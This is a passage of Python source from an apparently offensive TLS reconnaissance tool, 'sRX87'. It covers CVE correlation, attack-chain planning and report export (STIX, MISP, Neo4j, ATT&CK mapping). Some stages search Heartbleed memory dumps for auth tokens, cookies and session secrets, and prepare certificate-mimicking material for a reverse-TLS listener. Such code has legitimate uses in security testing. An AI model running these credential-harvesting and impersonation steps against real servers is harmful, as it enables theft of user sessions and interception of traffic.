    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    dh_bits = kb.get("stage04.dh_param.p_bits")
    if dh_bits:
        emit_kv(emit, "dh_prime_bits", str(dh_bits),
                 DANGER if dh_bits < 2048 else OK)
    emit_kv(emit, "matched", str(r["matched"]), WARN if r["matched"] else OK)


def _stage11_cve_manger(emit, setk, kb):
    emit_header(emit, "CVE-2012-5081 Manger attack correlation")
    cve = CVE_DATABASE[14]
    r = _stage11_correlate_cve(cve, kb)
    setk("stage11.cve.2012_5081", r)
    emit_kv(emit, "cve", cve["id"] + " " + cve["name"], BRAND)
    parsed = KB.get("_stage02_parsed_chain") or []
    rsa_present = any(_stage02_key_strength(c)["type"] == "rsa" for c in parsed)
    emit_kv(emit, "rsa_in_chain", str(rsa_present), WARN if rsa_present else OK)
    if rsa_present:
        emit_alert(emit, "info",
                   "RSA present — verify stack for Manger CVE-2012-5081")
        setk("vulnerability.manger.surface", True)


def _stage11_chain_plan(emit, setk, kb):
    emit_header(emit, "building attack chain plan from detected preconditions")
    plan = _stage11_build_attack_chain(kb)
    setk("stage11.chain_plan", plan)
    emit_kv(emit, "chains_detected", str(plan["count"]),
             DANGER if plan["count"] > 0 else OK)
    for c in plan["chains"]:
        col = DANGER if c["severity"] == "CRITICAL" else WARN
        emit_kv(emit, c["name"], "[%s %.1f]" % (c["severity"], c["cvss"]), col)
        for i, step in enumerate(c["steps"]):
            emit_line(emit, "    " + MUTED + "%d. " % (i + 1) + step + A.RESET, MUTED)
    if plan["count"] > 0:
        emit_alert(emit, "exploit", "%d attack chains viable" % plan["count"])
        count("exploits")
        setk("exploit.chain_plan.viable", plan["count"])
    else:
        emit_alert(emit, "ok", "no attack chains viable")


def _stage11_master_secret(emit, setk, kb):
    emit_header(emit, "heap search for session secrets in Heartbleed leak")
    hb_vuln = kb.get("vulnerability.heartbleed.detected")
    hb_ext = kb.get("stage04.heartbleed.extension_advertised")
    dump_total = kb.get("stage04.heartbleed.dump.total_bytes", 0)
    if not hb_vuln and not hb_ext:
        emit_alert(emit, "info", "Heartbleed not detected — no leak available")
        setk("stage11.master_secret.skipped", True)
        return
    if not dump_total:
        emit_alert(emit, "info", "no memory dump collected")
        setk("stage11.master_secret.no_dump", True)
        return
    leaked_hex = kb.get("stage04.heartbleed.dump.raw_bytes")
    leaked = b""
    if isinstance(leaked_hex, str):
        try:
            leaked = binascii.unhexlify(leaked_hex)
        except Exception:
            leaked = b""
    search = _stage11_heap_search(leaked)
    setk("stage11.master_secret.search", search)
    emit_kv(emit, "leaked_bytes", str(search["total_bytes"]), BRAND)
    emit_kv(emit, "high_entropy_48B", str(search["candidates_48"]),
             WARN if search["candidates_48"] else VALUE)
    emit_kv(emit, "high_entropy_32B", str(search["candidates_32"]))
    emit_kv(emit, "auth_tokens_found", str(len(search["auth_like"])),
             DANGER if search["auth_like"] else VALUE)
    for tok in search["auth_like"][:4]:
        emit_kv(emit, "token", tok[:48], DANGER)
    emit_kv(emit, "cookie_headers_found", str(len(search["cookie_like"])),
             DANGER if search["cookie_like"] else VALUE)
    for c in search["cookie_like"][:4]:
        emit_kv(emit, "cookie", c[:48], WARN)
    for cand in search["session_key_candidates"][:4]:
        emit_kv(emit, "cand_%d" % cand["offset"],
                 "H=%.2f %s" % (cand["entropy"], cand["preview_hex"]), ACCENT)
    if search["auth_like"] or search["cookie_like"]:
        emit_alert(emit, "exploit",
                   "usable credential material recovered from leaked memory")
        count("exploits")
        count("vulns")
        setk("exploit.master_secret.credentials_found", True)
    elif search["candidates_48"] > 0:
        emit_alert(emit, "warn",
                   "high-entropy 48B windows present — session secret candidates")
        setk("exploit.master_secret.candidates", search["candidates_48"])
    else:
        emit_alert(emit, "info",
                   "no obvious credential material in leaked window")


def _stage11_rev_tls(emit, setk, kb):
    emit_header(emit, "preparing reverse-TLS listener material from real chain")
    parsed = KB.get("_stage02_parsed_chain") or []
    if not parsed:
        emit_alert(emit, "info", "no chain cached")
        setk("stage11.rev_tls.skipped", True)
        return
    leaf = parsed[0]
    target = _current_target()
    cn = leaf.subject_cn() or "unknown"
    sans = list(leaf.san_dns or [])
    serial = leaf.serial
    sig_alg = leaf.sig_hash
    fingerprint = hashlib.sha256(leaf.der).hexdigest()
    material = {
        "target_host": target.host,
        "target_port": target.port,
        "mimic_cn": cn,
        "mimic_sans": sans[:16],
        "mimic_serial": "0x%x" % serial,
        "mimic_sig_alg": sig_alg,
        "target_cert_sha256": fingerprint,
        "listener_port_suggestion": 8443,
        "reason": "client sees matching CN/SAN; pinning on exact cert fingerprint still fails",
    }
    setk("exploit.rev_tls.material", material)
    emit_kv(emit, "target", "%s:%d" % (target.host, target.port), BRAND)
    emit_kv(emit, "mimic_cn", cn, WARN)
    emit_kv(emit, "mimic_san_count", str(len(sans)), VALUE)
    for s in sans[:6]:
        emit_line(emit, "    " + GLYPH_BULLET + " " + s, VALUE2)
    emit_kv(emit, "mimic_serial", "0x%x" % serial, VALUE)
    emit_kv(emit, "mimic_sig_alg", sig_alg, VALUE)
    emit_kv(emit, "target_sha256", fingerprint[:32] + "...", VALUE)
    emit_kv(emit, "listener_port_suggestion",
             str(material["listener_port_suggestion"]), BRAND)
    emit_alert(emit, "exploit",
               "reverse-TLS material prepared (CN+SAN+serial mimic)")
    count("exploits")
    setk("exploit.rev_tls.prepared", True)


def _stage11_timeline(emit, setk, kb):
    emit_header(emit, "attack timeline reconstruction from KB")
    stages_seen = {}
    for k, v in kb.items():
        if k.startswith("stage") and "." in k:
            parts = k.split(".")
            if len(parts) >= 2:
                stage = parts[0]
                if stage not in stages_seen:
                    stages_seen[stage] = {"events": 0, "keys": 0}
                stages_seen[stage]["keys"] += 1
    vulns = [k for k, v in kb.items() if k.startswith("vulnerability.") and v is True]
    exploits = [k for k, v in kb.items() if k.startswith("exploit.") and v is True]
    bypasses = [k for k, v in kb.items() if k.startswith("bypass.") and v is True]
    setk("stage11.timeline.stages_seen", stages_seen)
    setk("stage11.timeline.vulnerabilities", vulns)
    setk("stage11.timeline.exploits", exploits)
    setk("stage11.timeline.bypasses", bypasses)
    emit_kv(emit, "target", kb.get("meta.target", "?"), BRAND)
    emit_kv(emit, "kb_keys_total", str(len(kb.keys())), VALUE)
    emit_kv(emit, "stages_observed", str(len(stages_seen)), BRAND)
    for stage in sorted(stages_seen.keys()):
        emit_kv(emit, stage, "%d keys" % stages_seen[stage]["keys"], VALUE)
    emit_kv(emit, "vulnerabilities_detected", str(len(vulns)),
             DANGER if vulns else OK)
    for v in vulns[:12]:
        emit_kv(emit, "  vuln", v, WARN)
    emit_kv(emit, "exploits_prepared", str(len(exploits)),
             DANGER if exploits else OK)
    for e in exploits[:8]:
        emit_kv(emit, "  exploit", e, ACCENT)


def _stage11_differential(emit, setk, kb):
    emit_header(emit, "differential scan vs baseline file")
    baseline_path = "srx87_baseline.json"
    current = {
        "target": kb.get("meta.target"),
        "cert_cn": kb.get("stage02.leaf.subject_cn") or "",
        "cert_serial": kb.get("stage02.leaf.serial") or "",
        "vulnerabilities": [k for k, v in kb.items()
                            if k.startswith("vulnerability.") and v is True],
    }
    setk("stage11.differential.current", current)
    if not os.path.exists(baseline_path):
        emit_kv(emit, "baseline_file", baseline_path + " (absent)", MUTED)
        emit_alert(emit, "info",
                   "no baseline — current state recorded for next run")
        try:
            with open(baseline_path, "w", encoding="utf-8") as f:
                json.dump(current, f, indent=2, default=str)
            emit_kv(emit, "baseline_written", baseline_path, OK)
            setk("stage11.differential.baseline_written", True)
        except Exception as e:
            emit_kv(emit, "baseline_write_error", str(e)[:80], MUTED)
        return
    try:
        with open(baseline_path, "r", encoding="utf-8") as f:
            baseline = json.load(f)
    except Exception as e:
        emit_kv(emit, "baseline_read_error", str(e)[:80], MUTED)
        return
    changes = []
    base_vulns = set(baseline.get("vulnerabilities", []))
    cur_vulns = set(current["vulnerabilities"])
    new_vulns = cur_vulns - base_vulns
    fixed_vulns = base_vulns - cur_vulns
    for k, v in baseline.items():
        if k in current and baseline[k] != current[k]:
            changes.append({"field": k, "before": str(baseline[k])[:120],
                            "after": str(current[k])[:120]})
    setk("stage11.differential.changes", changes)
    setk("stage11.differential.new_vulns", list(new_vulns))
    setk("stage11.differential.fixed_vulns", list(fixed_vulns))
    emit_kv(emit, "fields_changed", str(len(changes)),
             WARN if changes else OK)
    for c in changes[:8]:
        emit_kv(emit, c["field"], "before → after", WARN)
    emit_kv(emit, "new_vulnerabilities", str(len(new_vulns)),
             DANGER if new_vulns else OK)
    for n in list(new_vulns)[:8]:
        emit_kv(emit, "  new", n, DANGER)
    emit_kv(emit, "fixed_vulnerabilities", str(len(fixed_vulns)),
             OK if fixed_vulns else MUTED)
    for f in list(fixed_vulns)[:8]:
        emit_kv(emit, "  fixed", f, OK)
    if new_vulns:
        emit_alert(emit, "vuln",
                   "regression: %d new vulnerabilities vs baseline" % len(new_vulns))
        count("vulns")
    elif changes:
        emit_alert(emit, "info",
                   "config changes detected, no new vulnerabilities")
    else:
        emit_alert(emit, "ok", "no changes vs baseline")


register_stage(StageSpec(11, "stage_11_cve_and_chain",
    "CVE Correlation & Exploit Chains",
    "Correlates 15 real CVEs against findings from Stages 02-10 and builds attack chains "
    "from detected preconditions. Heap search on any Heartbleed dump for 48-byte session "
    "secrets and cookie/auth tokens. Prepares reverse-TLS listener material with mimic "
    "CN/SAN/serial. Reconstructs attack timeline. Diffs against a baseline file.",
    [
        TestSpec("cve.2014_0160", "Heartbleed CVE correlation",
                 _stage11_cve_heartbleed, 10.0),
        TestSpec("cve.2016_0800", "DROWN CVE correlation",
                 _stage11_cve_drown, 10.0),
        TestSpec("cve.2014_3566", "POODLE CVE correlation",
                 _stage11_cve_poodle, 10.0),
        TestSpec("cve.2015_4000", "Logjam CVE correlation",
                 _stage11_cve_logjam, 10.0),
        TestSpec("cve.2015_0204", "FREAK CVE correlation",
                 _stage11_cve_freak, 10.0),
        TestSpec("cve.2017_15361", "ROCA CVE correlation",
                 _stage11_cve_roca, 10.0),
        TestSpec("cve.2016_2107", "AES-NI CBC oracle correlation",
                 _stage11_cve_openssl_cbc, 10.0),
        TestSpec("cve.2016_9244", "F5 Ticketbleed correlation",
                 _stage11_cve_ticketbleed, 10.0),
        TestSpec("cve.2022_21449", "Java ECDSA psychic signatures",
                 _stage11_cve_java_ecdsa, 10.0),
        TestSpec("cve.2022_31813", "Apache XFF bypass correlation",
                 _stage11_cve_apache_xff, 10.0),
        TestSpec("cve.2023_44487", "HTTP/2 Rapid Reset correlation",
                 _stage11_cve_rapid_reset, 10.0),
        TestSpec("cve.2024_27316", "HTTP/2 CONTINUATION flood correlation",
                 _stage11_cve_continuation, 10.0),
        TestSpec("cve.2019_1559", "OpenSSL 0-byte padding oracle correlation",
                 _stage11_cve_0byte, 10.0),
        TestSpec("cve.2020_1968", "Raccoon attack correlation",
                 _stage11_cve_raccoon, 10.0),
        TestSpec("cve.2012_5081", "Manger attack correlation",
                 _stage11_cve_manger, 10.0),
        TestSpec("chain.auto_plan", "attack chain planning",
                 _stage11_chain_plan, 15.0),
        TestSpec("chain.master_secret", "heap search for session secrets",
                 _stage11_master_secret, 20.0),
        TestSpec("chain.rev_tls", "reverse-TLS material prep",
                 _stage11_rev_tls, 10.0),
        TestSpec("chain.timeline", "attack timeline reconstruction",
                 _stage11_timeline, 10.0),
        TestSpec("chain.differential", "baseline diff",
                 _stage11_differential, 15.0),
    ], 180.0))


REPORT_DIR = "srx87_out"
REPORT_FILES = {
    "json": "srx87.json",
    "csv": "srx87.csv",
    "html": "srx87.html",
    "stix": "srx87.stix.json",
    "misp": "srx87.misp.json",
    "neo4j": "srx87.cypher",
    "attack_map": "srx87.attack_map.json",
    "cvss4": "srx87.cvss4.json",
    "dashboard": "srx87.dashboard.html",
    "timeline": "srx87.timeline.json",
    "pdf": "srx87.pdf",
    "sarif": "srx87.sarif.json",
    "defectdojo": "srx87.defectdojo.json",
    "github_issues": "srx87.github_issues.json",
    "jira": "srx87.jira.csv",
    "nessus": "srx87.nessus",
    "burp": "srx87.burp.xml",
    "zap": "srx87.zap.xml",
    "summary_text": "srx87.summary.txt",
    "exec_verdict": "srx87.verdict.json",
}


def _report_dir():
    try:
        os.makedirs(REPORT_DIR, exist_ok=True)
    except Exception:
        pass
    return REPORT_DIR


def _report_path(name):
    return os.path.join(_report_dir(), REPORT_FILES.get(name, name))


def _report_scan_meta(kb):
    return {
        "tool": "sRX87",
        "author": "SYLHETYHACKVENGER (THE-ERROR808)",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "target": kb.get("meta.target", "?"),
        "target_host": kb.get("meta.host", "?"),
        "target_port": kb.get("meta.port", 0),
        "scheme": kb.get("meta.scheme", "tcp"),
        "started_at": kb.get("meta.start_iso", ""),
        "python": kb.get("meta.python", ""),
        "platform": kb.get("meta.platform", ""),
    }


def _report_collect_findings(kb):
    out = {"vulnerabilities": [], "bypasses": [], "exploits": [],
           "cipher_findings": [], "cert_findings": [], "server_headers": []}
    for k, v in kb.items():
        if k.startswith("vulnerability.") and v is True:
            out["vulnerabilities"].append(k)
        elif k.startswith("bypass.") and v is True:
            out["bypasses"].append(k)
        elif k.startswith("exploit.") and v is True:
            out["exploits"].append(k)
    return out


def _report_serialize(v):
    if isinstance(v, bytes):
        return v.hex()
    if isinstance(v, (datetime,)):
        return v.isoformat()
    if isinstance(v, dict):
        return {str(k): _report_serialize(x) for k, x in v.items()}
    if isinstance(v, (list, tuple, set)):
        return [_report_serialize(x) for x in v]
    if isinstance(v, KBEntry):
        return _report_serialize(v.value)
    try:
        json.dumps(v)
        return v
    except Exception:
        return str(v)


def _report_full_snapshot(kb):
    return {
        "meta": _report_scan_meta(kb),
        "counters": COUNTERS.all(),
        "findings": _report_collect_findings(kb),
        "kb": {k: _report_serialize(v) for k, v in kb.items()},
        "stages": [s.index for s in STAGES],
    }


def _report_write_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)
        return os.path.getsize(path)
    except Exception:
        return 0


def _report_severity(key):
    crit = ("heartbleed.detected", "robot.detected", "drown.detected",
            "rsa_factoring.detected", "wiener.detected", "subdomain_takeover.detected",
            "ssrf_cloud.detected", "acl_header_auth_bypass.detected",
            "jwt_alg_none.detected", "jwt_hs_rs.detected", "k8s_api.detected",
            "aws_imdsv1.detected", "aws_imdsv2.detected", "gcp_metadata.detected",
            "alibaba_metadata.detected", "zone_transfer.detected",
            "container_escape.detected", "docker_socket.detected",
            "sni_null.detected", "ecdh_invalid.detected")
    high = ("poodle.detected", "freak.detected", "bleichenbacher.detected",
            "smuggle_clte.detected", "smuggle_tecl.detected", "smuggle_tete.detected",
            "smuggle_cl0.detected", "rapid_reset", "continuation_flood",
            "header_auth_bypass", "cve_2023_44487", "cve_2024_27316",
            "cert_expired", "cipher_downgrade", "version_downgrade",
            "rsa_kx.accepted", "path_trailing_dot.detected",
            "path_double_slash.detected", "oauth_redirect.detected",
            "acl_path_override.detected", "acl_idor_sequential.detected")
    med = ("lucky13", "crime", "breach", "beast", "rc4", "time.signal",
           "ip_forwarded_chain", "method_override", "cache_unkeyed",
           "cache_host_poison", "header_case", "obs_fold", "sni_case",
           "sni_trailing_dot", "duplicate_ext", "invalid_ext_len",
           "record_fragmentation", "header_null", "path_semicolon",
           "path_url_encode", "path_overlong_utf8", "chunk_bad_len",
           "dh_param.detected", "dh_small_subgroup.detected",
           "ecdsa_nonce_reuse.detected", "ssrf_octal.detected",
           "ssrf_hex.detected", "ssrf_ipv6.detected", "ssrf_parser.detected",
           "ssrf_gopher.detected")
    low = ("acl_forced_browse", "acl_role_injection", "acl_http_method",
           "acl_double_encoding", "acl_idor_wildcard", "acl_idor_param_pollution",
           "rate_xff", "rate_case", "rate_concurrent", "header_unicode",
           "path_case", "header_whitespace")
    k = key.lower()
    for p in crit:
        if p in k:
            return ("CRITICAL", 9.5)
    for p in high:
        if p in k:
            return ("HIGH", 8.0)
    for p in med:
        if p in k:
            return ("MEDIUM", 5.5)
    for p in low:
        if p in k:
            return ("LOW", 3.0)
    return ("INFO", 0.0)


def _t12_01_json(emit, setk, kb):
    emit_header(emit, "writing JSON snapshot")
    path = _report_path("json")
    size = _report_write_json(path, _report_full_snapshot(kb))
    setk("stage12.report_json.path", path)
    setk("stage12.report_json.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "bytes", str(size), BRAND)


def _t12_02_csv(emit, setk, kb):
    emit_header(emit, "writing CSV export")
    path = _report_path("csv")
    rows = 0
    try:
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.writer(f)
            w.writerow(["category", "key", "value", "severity", "cvss"])
            for k, v in kb.items():
                if k.startswith(("meta.", "stage_", "_")):
                    continue
                sev, cvss = _report_severity(k) if isinstance(v, bool) and v else ("", "")
                if isinstance(v, (list, dict)):
                    v = json.dumps(_report_serialize(v))[:512]
                w.writerow([k.split(".", 1)[0], k, str(v)[:512], sev, cvss])
                rows += 1
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_csv.path", path)
    setk("stage12.report_csv.rows", rows)
    setk("stage12.report_csv.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "rows", str(rows), BRAND)


def _t12_03_html(emit, setk, kb):
    emit_header(emit, "writing styled HTML report")
    path = _report_path("html")
    snapshot = _report_full_snapshot(kb)
    findings = snapshot["findings"]
    target = kb.get("meta.target", "?")
    parts = [
        "<!doctype html><html><head><meta charset='utf-8'>",
        "<title>sRX87 report - " + target + "</title>",
        "<style>body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;",
        "background:#0d1117;color:#c9d1d9;margin:0;padding:24px}",
        "h1{color:#58a6ff;margin:0 0 4px}.sub{color:#8b949e;margin-bottom:24px}",
        ".card{background:#161b22;border:1px solid #30363d;border-radius:10px;",
        "padding:16px;margin-bottom:16px}",
        ".card h2{margin:0 0 12px;font-size:16px;color:#79c0ff;",
        "letter-spacing:.05em;text-transform:uppercase}",
        "table{width:100%;border-collapse:collapse;font-size:13px}",
        "th,td{padding:6px 10px;text-align:left;border-bottom:1px solid #21262d}",
        "th{color:#8b949e;font-weight:500;text-transform:uppercase;font-size:11px}",
        ".critical{color:#f85149;font-weight:bold}.high{color:#ff7b72;font-weight:bold}",
        ".medium{color:#d29922}.low{color:#8b949e}.ok{color:#3fb950}",
        ".metric{display:inline-block;background:#0d1117;border:1px solid #30363d;",
        "border-radius:8px;padding:10px 14px;margin:4px}",
        ".metric b{color:#58a6ff;font-size:22px;display:block}",
        ".metric span{color:#8b949e;font-size:11px;text-transform:uppercase}",
        ".author{color:#58a6ff;font-weight:bold}",
        "</style></head><body>",
        "<h1>sRX87 - SSL/TLS Reconnaissance Report</h1>",
        "<div class='sub'>Target <b>" + target + "</b> &middot; " +
        snapshot["meta"]["generated_at"] + " &middot; author <span class='author'>" +
        snapshot["meta"]["author"] + "</span></div>",
        "<div class='card'><h2>Summary</h2>",
    ]
    for label, val in (
        ("Vulnerabilities", len(findings["vulnerabilities"])),
        ("Bypasses", len(findings["bypasses"])),
        ("Exploits", len(findings["exploits"])),
        ("KB keys", len(kb.keys())),
        ("Stages run", len(STAGES)),
        ("Connections", COUNTERS.get("connections", 0)),
    ):
        parts.append("<div class='metric'><b>%s</b><span>%s</span></div>" % (val, label))
    parts.append("</div>")
    for section, key in (("Vulnerabilities", "vulnerabilities"),
                          ("Exploits", "exploits"),
                          ("Bypasses", "bypasses")):
        items = findings.get(key, [])
        if not items:
            continue
        parts.append("<div class='card'><h2>" + section + "</h2><table>")
        parts.append("<tr><th>Finding</th><th>Severity</th><th>CVSS</th></tr>")
        for item in items:
            sev, cvss = _report_severity(item)
            cls = sev.lower() if sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW") else "ok"
            parts.append("<tr><td>%s</td><td class='%s'>%s</td><td class='%s'>%.1f</td></tr>" %
                          (item, cls, sev, cls, cvss))
        parts.append("</table></div>")
    parts.append("</body></html>")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("".join(parts))
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_html.path", path)
    setk("stage12.report_html.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "bytes", str(size), BRAND)


def _t12_04_stix(emit, setk, kb):
    emit_header(emit, "writing STIX 2.1 bundle")
    path = _report_path("stix")
    snapshot = _report_full_snapshot(kb)
    target = kb.get("meta.target", "?")
    host = kb.get("meta.host", target)
    now = datetime.now(timezone.utc).isoformat()
    bundle_id = "bundle--" + hashlib.sha256((host + now).encode()).hexdigest()
    identity_id = "identity--" + hashlib.sha256(b"srx87").hexdigest()
    objects = [
        {"type": "identity", "spec_version": "2.1", "id": identity_id,
         "created": now, "modified": now, "name": "sRX87",
         "identity_class": "tool",
         "description": "SSL/TLS reconnaissance framework by SYLHETYHACKVENGER (THE-ERROR808)"},
    ]
    for vk in snapshot["findings"]["vulnerabilities"]:
        sev, cvss = _report_severity(vk)
        objects.append({
            "type": "indicator", "spec_version": "2.1",
            "id": "indicator--" + hashlib.sha256(vk.encode()).hexdigest(),
            "created": now, "modified": now,
            "name": vk, "pattern_type": "srx87", "pattern": vk,
            "valid_from": now,
            "description": "sRX87 detection: %s (severity %s, CVSS %.1f)" % (vk, sev, cvss),
            "labels": [sev.lower()],
            "created_by_ref": identity_id,
        })
    for ek in snapshot["findings"]["exploits"]:
        sev, cvss = _report_severity(ek)
        objects.append({
            "type": "indicator", "spec_version": "2.1",
            "id": "indicator--" + hashlib.sha256(("exploit." + ek).encode()).hexdigest(),
            "created": now, "modified": now,
            "name": ek, "pattern_type": "srx87", "pattern": ek,
            "valid_from": now,
            "description": "Exploit precondition: %s (severity %s)" % (ek, sev),
            "labels": ["exploit", sev.lower()],
            "created_by_ref": identity_id,
        })
    size = _report_write_json(path, {"type": "bundle", "id": bundle_id, "objects": objects})
    setk("stage12.report_stix.path", path)
    setk("stage12.report_stix.objects", len(objects))
    setk("stage12.report_stix.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "objects", str(len(objects)), BRAND)


def _t12_05_misp(emit, setk, kb):
    emit_header(emit, "writing MISP event")
    path = _report_path("misp")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")
    event = {"Event": {
        "info": "sRX87 TLS scan: " + host,
        "date": datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        "threat_level_id": "2", "analysis": "2", "distribution": "0",
        "Orgc": {"name": "SYLHETYHACKVENGER (THE-ERROR808)"}, "Attribute": [],
    }}
    attrs = event["Event"]["Attribute"]
    attrs.append({"type": "hostname", "category": "Network activity",
                  "value": host, "to_ids": False})
    for vk in snapshot["findings"]["vulnerabilities"]:
        sev, cvss = _report_severity(vk)
        attrs.append({"type": "text", "category": "External analysis",
                      "value": "%s [%s %.1f]" % (vk, sev, cvss),
                      "to_ids": False, "comment": "VULNERABILITY"})
    for ek in snapshot["findings"]["exploits"]:
        sev, cvss = _report_severity(ek)
        attrs.append({"type": "text", "category": "External analysis",
                      "value": "%s [%s %.1f]" % (ek, sev, cvss),
                      "to_ids": False, "comment": "EXPLOIT"})
    for bk in snapshot["findings"]["bypasses"]:
        sev, cvss = _report_severity(bk)
        attrs.append({"type": "text", "category": "External analysis",
                      "value": "%s [%s %.1f]" % (bk, sev, cvss),
                      "to_ids": False, "comment": "BYPASS"})
    size = _report_write_json(path, event)
    setk("stage12.report_misp.path", path)
    setk("stage12.report_misp.attributes", len(attrs))
    setk("stage12.report_misp.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "attributes", str(len(attrs)), BRAND)


def _t12_06_neo4j(emit, setk, kb):
    emit_header(emit, "writing Neo4j Cypher graph")
    path = _report_path("neo4j")
    snapshot = _report_full_snapshot(kb)
    host = kb.get("meta.host", "?")

    def esc(s):
        return str(s).replace("\\", "\\\\").replace("'", "\\'")

    lines = [
        "MERGE (h:Host {name: '%s'})" % esc(host),
        "SET h.target = '%s'" % esc(kb.get("meta.target", "?")),
        "SET h.scanned = '%s'" % esc(datetime.now(timezone.utc).isoformat()),
        "SET h.author = 'SYLHETYHACKVENGER (THE-ERROR808)'",
    ]
    for vk in snapshot["findings"]["vulnerabilities"]:
        sev, cvss = _report_severity(vk)
        node = "CVE" if "cve-" in vk.lower() else "Vulnerability"
        lines.append("MERGE (v:%s {name: '%s'})" % (node, esc(vk)))
        lines.append("SET v.severity = '%s', v.cvss = %.1f" % (esc(sev), cvss))
        lines.append("MERGE (h)-[:HAS_FINDING]->(v)")
    for ek in snapshot["findings"]["exploits"]:
        sev, cvss = _report_severity(ek)
        lines.append("MERGE (e:Exploit {name: '%s'})" % esc(ek))
        lines.append("SET e.severity = '%s', e.cvss = %.1f" % (esc(sev), cvss))
        lines.append("MERGE (h)-[:EXPLOITABLE_VIA]->(e)")
    for bk in snapshot["findings"]["bypasses"]:
        lines.append("MERGE (b:Bypass {name: '%s'})" % esc(bk))
        lines.append("MERGE (h)-[:BYPASSABLE_VIA]->(b)")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        size = os.path.getsize(path)
    except Exception:
        size = 0
    setk("stage12.report_neo4j.path", path)
    setk("stage12.report_neo4j.statements", len(lines))
    setk("stage12.report_neo4j.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "statements", str(len(lines)), BRAND)


ATTACK_MAP_RULES = [
    ("heartbleed", ["T1190", "T1005"], "Exploit public-facing app + data from local system"),
    ("robot", ["T1190", "T1600"], "Exploit public-facing app + weaken encryption"),
    ("drown", ["T1190", "T1040"], "Exploit public-facing app + network sniffing"),
    ("poodle", ["T1190", "T1040"], "Exploit public-facing app + network sniffing"),
    ("freak", ["T1190", "T1600"], "Exploit public-facing app + weaken encryption"),
    ("logjam", ["T1190", "T1600"], "Exploit public-facing app + weaken encryption"),
    ("rc4", ["T1040"], "Network sniffing / RC4 bias"),
    ("crime", ["T1190", "T1040"], "Compression oracle"),
    ("breach", ["T1190", "T1040"], "Compression oracle"),
    ("lucky13", ["T1190"], "Timing side channel"),
    ("beast", ["T1190", "T1040"], "CBC IV attack"),
    ("rsa_factoring", ["T1600", "T1553"], "Weaken encryption / subvert trust"),
    ("roca", ["T1600", "T1553"], "Weaken encryption / subvert trust"),
    ("wiener", ["T1600"], "Weaken encryption"),
    ("smuggle", ["T1190", "T1027"], "Request smuggling"),
    ("rapid_reset", ["T1499"], "Endpoint DoS"),
    ("continuation", ["T1499"], "Endpoint DoS"),
    ("ssrf_cloud", ["T1552", "T1078"], "Unsecured credentials + valid accounts"),
    ("ssrf_gopher", ["T1190", "T1027"], "SSRF via non-HTTP scheme"),
    ("ssrf_parser", ["T1190", "T1027"], "SSRF parser confusion"),
    ("jwt_alg_none", ["T1078", "T1550"], "Valid accounts + alternate auth"),
    ("jwt_hs_rs", ["T1078", "T1550"], "Valid accounts + alternate auth"),
    ("acl_header_auth_bypass", ["T1078", "T1548"], "Valid accounts + abuse elevation"),
    ("acl_path_override", ["T1078", "T1190"], "Path override bypass"),
    ("acl_role_injection", ["T1078", "T1548"], "Role injection"),
    ("cache_host_poison", ["T1190", "T1027"], "Cache poisoning"),
    ("docker_socket", ["T1610", "T1611"], "Deploy container + escape"),
    ("container_escape", ["T1611"], "Escape to host"),
    ("k8s_api", ["T1078", "T1609"], "K8s API access"),
    ("aws_imdsv1", ["T1552"], "Unsecured credentials"),
    ("aws_imdsv2", ["T1552"], "Unsecured credentials"),
    ("gcp_metadata", ["T1552"], "Unsecured credentials"),
    ("alibaba_metadata", ["T1552"], "Unsecured credentials"),
    ("zone_transfer", ["T1590", "T1596"], "Gather network info"),
    ("obs_fold", ["T1190", "T1027"], "Header obfuscation"),
    ("null_byte", ["T1190", "T1027"], "Null byte bypass"),
    ("method_override", ["T1078", "T1190"], "Method override"),
    ("double_encoding", ["T1190", "T1027"], "Path double encoding"),
]


def _t12_07_attack_map(emit, setk, kb):
    emit_header(emit, "mapping findings to MITRE ATT&CK techniques")
    path = _report_path("attack_map")
    snapshot = _report_full_snapshot(kb)
    all_findings = (snapshot["findings"]["vulnerabilities"] +
                    snapshot["findings"]["exploits"] +
                    snapshot["findings"]["bypasses"])
    techniques = {}
    for finding in all_findings:
        fl = finding.lower()
        for pattern, ttps, description in ATTACK_MAP_RULES:
            if pattern in fl:
                for t in ttps:
                    if t not in techniques:
                        techniques[t] = {"findings": [], "description": description}
                    techniques[t]["findings"].append(finding)
    output = {
        "target": kb.get("meta.target", "?"),
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "author": "SYLHETYHACKVENGER (THE-ERROR808)",
        "total_techniques": len(techniques),
        "techniques": techniques,
    }
    size = _report_write_json(path, output)
    setk("stage12.report_attack_map.path", path)
    setk("stage12.report_attack_map.techniques", len(techniques))
    setk("stage12.report_attack_map.size", size)
    emit_kv(emit, "path", path, OK if size else DANGER)
    emit_kv(emit, "techniques_mapped", str(len(techniques)), BRAND)
    for t in sorted(techniques.keys())[:10]:
        emit_kv(emit, t, "%d findings" % len(techniques[t]["findings"]), ACCENT)


def _t12_08_cvss4(emit, setk, kb):
    emit_header(emit, "computing CVSS 4.0 base scores for every finding")
    path = _report_path("cvss4")
    snapshot = _report_full_snapshot(kb)
    all_findings = (snapshot["findings"]["vulnerabilities"] +
                    snapshot["findings"]["exploits"] +
                    snapshot["findings"]["bypasses"])
    scored = []
    for f in all_findings:
        sev, cvss = _report_severity(f)
        vector = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H"
        if cvss < 5.0:
